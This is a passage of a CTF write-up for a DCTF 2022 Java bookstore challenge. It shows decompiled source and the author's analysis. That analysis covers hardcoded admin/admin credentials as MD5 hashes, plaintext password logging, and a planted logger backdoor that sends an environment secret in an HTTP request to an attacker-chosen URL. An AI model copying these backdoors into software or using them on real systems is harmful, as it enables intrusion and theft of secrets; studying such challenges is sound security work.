+        <span class="n">String</span> <span class="n">curr_time</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">returnCurrentTime</span><span class="o">();</span>
+        <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">&#34;INFO &#34;</span><span class="o">);</span>
+        <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">&#34;[&#34;</span><span class="o">);</span>
+        <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">curr_time</span><span class="o">);</span>
+        <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">&#34;] --&gt; &#34;</span><span class="o">);</span>
+        <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">info_mssg</span><span class="o">);</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">writeToLogfile</span><span class="o">(</span><span class="n">sb</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">err</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">sb</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">warning</span><span class="o">(</span><span class="n">String</span> <span class="n">warn_mssg</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">StringBuilder</span> <span class="n">sb</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="o">();</span>
+        <span class="n">String</span> <span class="n">curr_time</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">returnCurrentTime</span><span class="o">();</span>
+        <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">&#34;WARN &#34;</span><span class="o">);</span>
+        <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">&#34;[&#34;</span><span class="o">);</span>
+        <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">curr_time</span><span class="o">);</span>
+        <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">&#34;] --&gt; &#34;</span><span class="o">);</span>
+        <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">warn_mssg</span><span class="o">);</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">writeToLogfile</span><span class="o">(</span><span class="n">sb</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">err</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">sb</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">debug</span><span class="o">(</span><span class="n">String</span> <span class="n">debug_mssg</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">StringBuilder</span> <span class="n">sb</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="o">();</span>
+        <span class="n">String</span> <span class="n">curr_time</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">returnCurrentTime</span><span class="o">();</span>
+        <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">&#34;DEBUG &#34;</span><span class="o">);</span>
+        <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">&#34;[&#34;</span><span class="o">);</span>
+        <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">curr_time</span><span class="o">);</span>
+        <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="s">&#34;] --&gt; &#34;</span><span class="o">);</span>
+        <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">debug_mssg</span><span class="o">);</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">writeToLogfile</span><span class="o">(</span><span class="n">sb</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">err</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">sb</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div>
+</details>
+
+<details>
+	<summary>Art.java</summary>
+	<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">book.store</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.awt.Color</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.awt.Font</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.awt.FontMetrics</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.awt.Graphics</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.awt.Graphics2D</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.awt.image.BufferedImage</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Art</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">int</span> <span class="n">ART_SIZE_SMALL</span> <span class="o">=</span> <span class="n">12</span><span class="o">;</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">int</span> <span class="n">ART_SIZE_MEDIUM</span> <span class="o">=</span> <span class="n">18</span><span class="o">;</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">int</span> <span class="n">ART_SIZE_LARGE</span> <span class="o">=</span> <span class="n">24</span><span class="o">;</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">int</span> <span class="n">ART_SIZE_HUGE</span> <span class="o">=</span> <span class="n">32</span><span class="o">;</span>
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">DEFAULT_ART_SYMBOL</span> <span class="o">=</span> <span class="s">&#34;*&#34;</span><span class="o">;</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">printTextArt</span><span class="o">(</span><span class="n">String</span> <span class="n">artText</span><span class="o">,</span> <span class="kt">int</span> <span class="n">textHeight</span><span class="o">,</span> <span class="n">ASCIIArtFont</span> <span class="n">fontType</span><span class="o">,</span> <span class="n">String</span> <span class="n">artSymbol</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="n">String</span> <span class="n">frequency</span> <span class="o">=</span> <span class="n">fontType</span><span class="o">.</span><span class="na">getValue</span><span class="o">();</span>
+        <span class="kt">int</span> <span class="n">analysis_should_be_fun</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">findImageWidth</span><span class="o">(</span><span class="n">textHeight</span><span class="o">,</span> <span class="n">artText</span><span class="o">,</span> <span class="n">frequency</span><span class="o">);</span>
+        <span class="n">BufferedImage</span> <span class="n">image</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedImage</span><span class="o">(</span><span class="n">analysis_should_be_fun</span><span class="o">,</span> <span class="n">textHeight</span><span class="o">,</span> <span class="n">1</span><span class="o">);</span>
+        <span class="n">Graphics</span> <span class="n">g</span> <span class="o">=</span> <span class="n">image</span><span class="o">.</span><span class="na">getGraphics</span><span class="o">();</span>
+        <span class="n">Font</span> <span class="n">font</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Font</span><span class="o">(</span><span class="n">frequency</span><span class="o">,</span> <span class="n">1</span><span class="o">,</span> <span class="n">textHeight</span><span class="o">);</span>
+        <span class="n">g</span><span class="o">.</span><span class="na">setFont</span><span class="o">(</span><span class="n">font</span><span class="o">);</span>
+        <span class="n">Graphics2D</span> <span class="n">graphics</span> <span class="o">=</span> <span class="o">(</span><span class="n">Graphics2D</span><span class="o">)</span> <span class="n">g</span><span class="o">;</span>
+        <span class="n">graphics</span><span class="o">.</span><span class="na">drawString</span><span class="o">(</span><span class="n">artText</span><span class="o">,</span> <span class="n">0</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">getBaselinePosition</span><span class="o">(</span><span class="n">g</span><span class="o">,</span> <span class="n">font</span><span class="o">));</span>
+        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">y</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span> <span class="n">y</span> <span class="o">&lt;</span> <span class="n">textHeight</span><span class="o">;</span> <span class="o">++</span><span class="n">y</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">StringBuilder</span> <span class="n">sb</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="o">();</span>
+            <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span> <span class="n">x</span> <span class="o">&lt;</span> <span class="n">analysis_should_be_fun</span><span class="o">;</span> <span class="o">++</span><span class="n">x</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">image</span><span class="o">.</span><span class="na">getRGB</span><span class="o">(</span><span class="n">x</span><span class="o">,</span> <span class="n">y</span><span class="o">)</span> <span class="o">==</span> <span class="n">Color</span><span class="o">.</span><span class="na">WHITE</span><span class="o">.</span><span class="na">getRGB</span><span class="o">()</span> <span class="o">?</span> <span class="n">artSymbol</span> <span class="o">:</span> <span class="s">&#34; &#34;</span><span class="o">);</span>
+            <span class="o">}</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">sb</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">trim</span><span class="o">().</span><span class="na">isEmpty</span><span class="o">())</span> <span class="k">continue</span><span class="o">;</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">sb</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">printTextArt</span><span class="o">(</span><span class="n">String</span> <span class="n">artText</span><span class="o">,</span> <span class="kt">int</span> <span class="n">textHeight</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">printTextArt</span><span class="o">(</span><span class="n">artText</span><span class="o">,</span> <span class="n">textHeight</span><span class="o">,</span> <span class="n">ASCIIArtFont</span><span class="o">.</span><span class="na">ART_FONT_DIALOG</span><span class="o">,</span> <span class="n">DEFAULT_ART_SYMBOL</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">private</span> <span class="kt">int</span> <span class="nf">findImageWidth</span><span class="o">(</span><span class="kt">int</span> <span class="n">textHeight</span><span class="o">,</span> <span class="n">String</span> <span class="n">artText</span><span class="o">,</span> <span class="n">String</span> <span class="n">fontName</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">BufferedImage</span> <span class="n">im</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedImage</span><span class="o">(</span><span class="n">1</span><span class="o">,</span> <span class="n">1</span><span class="o">,</span> <span class="n">1</span><span class="o">);</span>
+        <span class="n">Graphics</span> <span class="n">g</span> <span class="o">=</span> <span class="n">im</span><span class="o">.</span><span class="na">getGraphics</span><span class="o">();</span>
+        <span class="n">g</span><span class="o">.</span><span class="na">setFont</span><span class="o">(</span><span class="k">new</span> <span class="n">Font</span><span class="o">(</span><span class="n">fontName</span><span class="o">,</span> <span class="n">1</span><span class="o">,</span> <span class="n">textHeight</span><span class="o">));</span>
+        <span class="k">return</span> <span class="n">g</span><span class="o">.</span><span class="na">getFontMetrics</span><span class="o">().</span><span class="na">stringWidth</span><span class="o">(</span><span class="n">artText</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">private</span> <span class="kt">int</span> <span class="nf">getBaselinePosition</span><span class="o">(</span><span class="n">Graphics</span> <span class="n">g</span><span class="o">,</span> <span class="n">Font</span> <span class="n">font</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">FontMetrics</span> <span class="n">metrics</span> <span class="o">=</span> <span class="n">g</span><span class="o">.</span><span class="na">getFontMetrics</span><span class="o">(</span><span class="n">font</span><span class="o">);</span>
+        <span class="kt">int</span> <span class="n">y</span> <span class="o">=</span> <span class="n">metrics</span><span class="o">.</span><span class="na">getAscent</span><span class="o">()</span> <span class="o">-</span> <span class="n">metrics</span><span class="o">.</span><span class="na">getDescent</span><span class="o">();</span>
+        <span class="k">return</span> <span class="n">y</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kd">class</span> <span class="nc">ASCIIArtFont</span>
+    <span class="kd">extends</span> <span class="n">Enum</span> <span class="o">&lt;</span> <span class="n">ASCIIArtFont</span> <span class="o">&gt;</span> <span class="o">{</span>
+        <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="cm">/* enum */</span> <span class="n">ASCIIArtFont</span> <span class="n">ART_FONT_DIALOG</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ASCIIArtFont</span><span class="o">(</span><span class="s">&#34;Dialog&#34;</span><span class="o">);</span>
+        <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="cm">/* enum */</span> <span class="n">ASCIIArtFont</span> <span class="n">ART_FONT_DIALOG_INPUT</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ASCIIArtFont</span><span class="o">(</span><span class="s">&#34;DialogInput&#34;</span><span class="o">);</span>
+        <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="cm">/* enum */</span> <span class="n">ASCIIArtFont</span> <span class="n">ART_FONT_MONO</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ASCIIArtFont</span><span class="o">(</span><span class="s">&#34;Monospaced&#34;</span><span class="o">);</span>
+        <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="cm">/* enum */</span> <span class="n">ASCIIArtFont</span> <span class="n">ART_FONT_SERIF</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ASCIIArtFont</span><span class="o">(</span><span class="s">&#34;Serif&#34;</span><span class="o">);</span>
+        <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="cm">/* enum */</span> <span class="n">ASCIIArtFont</span> <span class="n">ART_FONT_SANS_SERIF</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ASCIIArtFont</span><span class="o">(</span><span class="s">&#34;SansSerif&#34;</span><span class="o">);</span>
+        <span class="kd">private</span> <span class="n">String</span> <span class="n">value</span><span class="o">;</span>
+        <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="cm">/* synthetic */</span> <span class="n">ASCIIArtFont</span><span class="o">[]</span> <span class="n">$VALUES</span><span class="o">;</span>
+
+        <span class="kd">public</span> <span class="kd">static</span> <span class="n">ASCIIArtFont</span><span class="o">[]</span> <span class="nf">values</span><span class="o">()</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="o">(</span><span class="n">ASCIIArtFont</span><span class="o">[])</span> <span class="n">$VALUES</span><span class="o">.</span><span class="na">clone</span><span class="o">();</span>
+        <span class="o">}</span>
+
+        <span class="kd">public</span> <span class="kd">static</span> <span class="n">ASCIIArtFont</span> <span class="nf">valueOf</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="n">Enum</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">ASCIIArtFont</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">name</span><span class="o">);</span>
+        <span class="o">}</span>
+
+        <span class="kd">public</span> <span class="n">String</span> <span class="nf">getValue</span><span class="o">()</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">value</span><span class="o">;</span>
+        <span class="o">}</span>
+
+        <span class="kd">private</span> <span class="nf">ASCIIArtFont</span><span class="o">(</span><span class="n">String</span> <span class="n">value</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">this</span><span class="o">.</span><span class="na">value</span> <span class="o">=</span> <span class="n">value</span><span class="o">;</span>
+        <span class="o">}</span>
+
+        <span class="kd">private</span> <span class="kd">static</span> <span class="cm">/* synthetic */</span> <span class="n">ASCIIArtFont</span><span class="o">[]</span> <span class="nf">$values</span><span class="o">()</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="k">new</span> <span class="n">ASCIIArtFont</span><span class="o">[]</span> <span class="o">{</span>
+                <span class="n">ART_FONT_DIALOG</span><span class="o">,</span>
+                <span class="n">ART_FONT_DIALOG_INPUT</span><span class="o">,</span>
+                <span class="n">ART_FONT_MONO</span><span class="o">,</span>
+                <span class="n">ART_FONT_SERIF</span><span class="o">,</span>
+                <span class="n">ART_FONT_SANS_SERIF</span>
+            <span class="o">};</span>
+        <span class="o">}</span>
+
+        <span class="kd">static</span> <span class="o">{</span>
+            <span class="n">$VALUES</span> <span class="o">=</span> <span class="n">ASCIIArtFont</span><span class="o">.</span><span class="na">$values</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div>
+</details>
+</p>
+<p>After a quick look, a piece of code catches my eye:</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="c1">// ServerSide.java line 110
+</span><span class="c1"></span>
+<span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">parseRequest</span><span class="o">(</span><span class="n">String</span> <span class="n">requestUri</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">UnsupportedEncodingException</span> <span class="o">{</span>
+    <span class="n">HashMap</span> <span class="o">&lt;</span> <span class="n">String</span><span class="o">,</span> <span class="n">String</span> <span class="o">&gt;</span> <span class="n">query_params</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">splitQuery</span><span class="o">(</span><span class="n">requestUri</span><span class="o">);</span>
+    <span class="n">String</span> <span class="n">username</span> <span class="o">=</span> <span class="n">query_params</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">&#34;username&#34;</span><span class="o">);</span>
+    <span class="n">String</span> <span class="n">password</span> <span class="o">=</span> <span class="n">query_params</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">&#34;password&#34;</span><span class="o">);</span>
+    <span class="n">String</span> <span class="n">hashed_username</span> <span class="o">=</span> <span class="n">ServerSide</span><span class="o">.</span><span class="na">getMd5</span><span class="o">(</span><span class="n">username</span><span class="o">);</span>
+    <span class="n">String</span> <span class="n">hashed_password</span> <span class="o">=</span> <span class="n">ServerSide</span><span class="o">.</span><span class="na">getMd5</span><span class="o">(</span><span class="n">password</span><span class="o">);</span>
+    <span class="n">String</span> <span class="n">mssg</span> <span class="o">=</span> <span class="s">&#34;username: &#34;</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="s">&#34;, password: &#34;</span> <span class="o">+</span> <span class="n">password</span><span class="o">;</span>
+    <span class="k">this</span><span class="o">.</span><span class="na">logger</span><span class="o">.</span><span class="na">info</span><span class="o">(</span><span class="n">mssg</span><span class="o">);</span>
+    <span class="k">return</span> <span class="n">hashed_username</span><span class="o">.</span><span class="na">equalsIgnoreCase</span><span class="o">(</span><span class="s">&#34;21232f297a57a5a743894a0e4a801fc3&#34;</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">hashed_password</span><span class="o">.</span><span class="na">equalsIgnoreCase</span><span class="o">(</span><span class="s">&#34;21232f297a57a5a743894a0e4a801fc3&#34;</span><span class="o">);</span>
+<span class="o">}</span>
+</code></pre></div><p>The function <strong>parseRequest()</strong> is used in the <strong>login</strong> phase and the hash <strong>21232f297a57a5a743894a0e4a801fc3</strong> corresponds to <strong>md5(admin)</strong></p>
+<p>After login in with username=admin and password=admin we are redirected to this static page <em>(containing <strong>8 paragraphs</strong> )</em> :</p>
+<p><img src="/p/dctf-2022-bookstore.java/afterlogin.PNG"
+	width="1336"
+	height="906"
+	srcset="/p/dctf-2022-bookstore.java/afterlogin_huae7f49278cd7b04e84caa35e125295a1_93448_480x0_resize_box_2.PNG 480w, /p/dctf-2022-bookstore.java/afterlogin_huae7f49278cd7b04e84caa35e125295a1_93448_1024x0_resize_box_2.PNG 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="147"
+		data-flex-basis="353px"
+	
+></p>
+<p>Nothing interesting at first sight. From the description of the challenge it seems that the dev has left a backdoor in the code and indeed one function is suspicious in the logging system :</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java">
+<span class="c1">// Logger.java line 80
+</span><span class="c1"></span>
+<span class="kd">private</span> <span class="kt">void</span> <span class="nf">downloadFile</span><span class="o">(</span><span class="n">String</span> <span class="n">url</span><span class="o">)</span> <span class="o">{</span>
+    <span class="k">try</span> <span class="o">{</span>
+        <span class="n">String</span> <span class="n">inputLine</span><span class="o">;</span>
+        <span class="n">URL</span> <span class="n">link</span> <span class="o">=</span> <span class="k">new</span> <span class="n">URL</span><span class="o">(</span><span class="n">url</span><span class="o">);</span>
+        <span class="n">link</span><span class="o">.</span><span class="na">toURI</span><span class="o">();</span>
+        <span class="n">HttpURLConnection</span> <span class="n">conn</span> <span class="o">=</span> <span class="o">(</span><span class="n">HttpURLConnection</span><span class="o">)</span> <span class="n">link</span><span class="o">.</span><span class="na">openConnection</span><span class="o">();</span>
+        <span class="n">conn</span><span class="o">.</span><span class="na">setRequestMethod</span><span class="o">(</span><span class="s">&#34;GET&#34;</span><span class="o">);</span>
+        <span class="n">conn</span><span class="o">.</span><span class="na">setRequestProperty</span><span class="o">(</span><span class="s">&#34;not-found&#34;</span><span class="o">,</span> <span class="n">System</span><span class="o">.</span><span class="na">getenv</span><span class="o">(</span><span class="s">&#34;NOT_FOUND&#34;</span><span class="o">));</span>
+        <span class="n">conn</span><span class="o">.</span><span class="na">setConnectTimeout</span><span class="o">(</span><span class="n">200</span><span class="o">);</span>
+        <span class="n">conn</span><span class="o">.</span><span class="na">setReadTimeout</span><span class="o">(</span><span class="n">200</span><span class="o">);</span>
+        <span class="kt">int</span> <span class="n">status</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="na">getResponseCode</span><span class="o">();</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">status</span> <span class="o">!=</span> <span class="n">200</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">return</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="n">BufferedReader</span> <span class="n">in</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="n">InputStreamReader</span><span class="o">(</span><span class="n">conn</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">()));</span>
+        <span class="n">StringBuffer</span> <span class="n">content</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuffer</span><span class="o">();</span>
+        <span class="k">while</span> <span class="o">((</span><span class="n">inputLine</span> <span class="o">=</span> <span class="n">in</span> <span class="o">.</span><span class="na">readLine</span><span class="o">())</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">content</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">inputLine</span><span class="o">);</span>
+        <span class="o">}</span> <span class="n">in</span> <span class="o">.</span><span class="na">close</span><span class="o">();</span>
+        <span class="n">conn</span><span class="o">.</span><span class="na">disconnect</span><span class="o">();</span>
+    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">return</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div><p>It seems that this function <em>(on the server side)</em> allows to make an HTTP request to a site that we can control if we can manipulate the <strong>url</strong> parameter.</p>
+<p>The only place where this function is called is just above :</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="c1">// Logger.java line 37
+</span><span class="c1"></span>  
+ <span class="kd">private</span> <span class="kt">void</span> <span class="nf">analyzeMessage</span><span class="o">(</span><span class="n">String</span> <span class="n">mssg</span><span class="o">)</span> <span class="o">{</span>
+     <span class="n">Pattern</span> <span class="n">pattern</span> <span class="o">=</span> <span class="n">Pattern</span><span class="o">.</span><span class="na">compile</span><span class="o">(</span><span class="s">&#34;log\\{.*\\}salt&#34;</span> <span class="o">+</span> <span class="n">System</span><span class="o">.</span><span class="na">getenv</span><span class="o">(</span><span class="s">&#34;SALT&#34;</span><span class="o">));</span>
+     <span class="n">Matcher</span> <span class="n">matcher</span> <span class="o">=</span> <span class="n">pattern</span><span class="o">.</span><span class="na">matcher</span><span class="o">(</span><span class="n">mssg</span><span class="o">);</span>
+     <span class="n">String</span> <span class="n">substring</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+     <span class="k">if</span> <span class="o">(</span><span class="n">matcher</span><span class="o">.</span><span class="na">find</span><span class="o">())</span> <span class="o">{</span>
+         <span class="n">substring</span> <span class="o">=</span> <span class="n">matcher</span><span class="o">.</span><span class="na">group</span><span class="o">();</span>
+     <span class="o">}</span>
+     <span class="k">if</span> <span class="o">(</span><span class="n">substring</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+         <span class="n">substring</span> <span class="o">=</span> <span class="n">substring</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">substring</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="n">123</span><span class="o">)</span> <span class="o">+</span> <span class="n">1</span><span class="o">,</span> <span class="n">substring</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="n">125</span><span class="o">));</span>
+         <span class="n">App</span><span class="o">.</span><span class="na">ss</span><span class="o">.</span><span class="na">logger</span><span class="o">.</span><span class="na">info</span><span class="o">(</span><span class="n">substring</span><span class="o">);</span>
+     <span class="o">}</span>
+     <span class="n">pattern</span> <span class="o">=</span> <span class="n">Pattern</span><span class="o">.</span><span class="na">compile</span><span class="o">(</span><span class="s">&#34;get\\{.*\\}salt=&#34;</span> <span class="o">+</span> <span class="n">System</span><span class="o">.</span><span class="na">getenv</span><span class="o">(</span><span class="s">&#34;SALT&#34;</span><span class="o">));</span>
+     <span class="n">matcher</span> <span class="o">=</span> <span class="n">pattern</span><span class="o">.</span><span class="na">matcher</span><span class="o">(</span><span class="n">mssg</span><span class="o">);</span>
+     <span class="n">substring</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+     <span class="k">if</span> <span class="o">(</span><span class="n">matcher</span><span class="o">.</span><span class="na">find</span><span class="o">())</span> <span class="o">{</span>
+         <span class="n">substring</span> <span class="o">=</span> <span class="n">matcher</span><span class="o">.</span><span class="na">group</span><span class="o">();</span>
+     <span class="o">}</span>
+     <span class="k">if</span> <span class="o">(</span><span class="n">substring</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+         <span class="n">substring</span> <span class="o">=</span> <span class="n">substring</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">substring</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="n">123</span><span class="o">)</span> <span class="o">+</span> <span class="n">1</span><span class="o">,</span> <span class="n">substring</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="n">125</span><span class="o">));</span>
+         <span class="k">this</span><span class="o">.</span><span class="na">downloadFile</span><span class="o">(</span><span class="n">substring</span><span class="o">);</span>
+     <span class="o">}</span>
+
+	<span class="o">[...]</span>
+</code></pre></div><p>This function is very important: we can call the backdoor <strong>downloadFile()</strong> if the <strong>mssg</strong> parameter respects the regular expression pattern :</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="s">&#34;get\\{.*\\}salt=&#34;</span> <span class="o">+</span> <span class="n">System</span><span class="o">.</span><span class="na">getenv</span><span class="o">(</span><span class="s">&#34;SALT&#34;</span><span class="o">)</span>
+</code></pre></div><p>and the parameter sent to the <strong>download()</strong> function <em>(which will be the <strong>url</strong> of the request executed by the server)</em> will be what is between { and }</p>
+<p>However, it is necessary to find the value of the <strong>environment variable &ldquo;SALT&rdquo;</strong> concatenated in the pattern <em>(but we will see that in the next step)</em></p>
+<p>Again, we need to be able to reach this function, and it is only called in the following function:</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="c1">// Logger.java line 25
+</span><span class="c1"></span>  
+<span class="kd">private</span> <span class="kt">void</span> <span class="nf">writeToLogfile</span><span class="o">(</span><span class="n">String</span> <span class="n">logMessage</span><span class="o">)</span> <span class="o">{</span>
+    <span class="k">try</span> <span class="o">{</span>
+        <span class="n">FileWriter</span> <span class="n">fstream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileWriter</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">logfile</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
+        <span class="n">BufferedWriter</span> <span class="n">out</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedWriter</span><span class="o">(</span><span class="n">fstream</span><span class="o">);</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">analyzeMessage</span><span class="o">(</span><span class="n">logMessage</span><span class="o">);</span>
+        <span class="n">out</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">logMessage</span> <span class="o">+</span> <span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">&#34;line.separator&#34;</span><span class="o">));</span>
+        <span class="n">out</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
